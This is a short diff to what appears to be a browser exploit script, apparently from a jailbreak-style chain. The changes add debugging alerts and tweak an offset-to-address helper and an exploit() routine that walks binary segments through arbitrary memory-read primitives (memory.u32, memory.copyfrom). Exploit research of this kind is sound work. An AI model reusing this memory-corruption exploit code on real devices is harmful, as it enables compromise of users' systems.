@@ -49,10 +49,12 @@ function hexdump(buffer, blockSize, base) {
     }
     return lines.join("<br/>");
 }
+let logic = 0;
 function off2addr(segs, off)
     {
+  
         if(!(off instanceof Int64)) off = new Int64(off);
-        for(var i = 0; i < segs.length; ++i)
+        for(var i = 0; i < 3; ++i)
         {
             var start = segs[i].fileoff;
             var end   = Add(start, segs[i].size);
@@ -63,9 +65,11 @@ function off2addr(segs, off)
                 (end.hi() > off.hi() || (end.hi() == off.hi() && end.lo() > off.lo()))
             )
             {
+                //logic = 1;
                 alert("returning"+ Add(segs[i].addr, Sub(off, start)));
                 return Add(segs[i].addr, Sub(off, start));
             }
+
         }
         return new Int64("0x4141414141414141");
     }
@@ -696,7 +700,7 @@ function exploit(){
             var straddr = off2addr(segs, memory.u32(Add(Add(imgs,m),0x18)));
             var fn = function(i)
             {
-                var g = memory.copyfrom(Add(straddr, i),0,0x10);
+                var g = memory.copyfrom(Add(straddr, i),0,50);
                 alert("g"+g)
                 //alert("g[0]"+g[0])
                 return g;
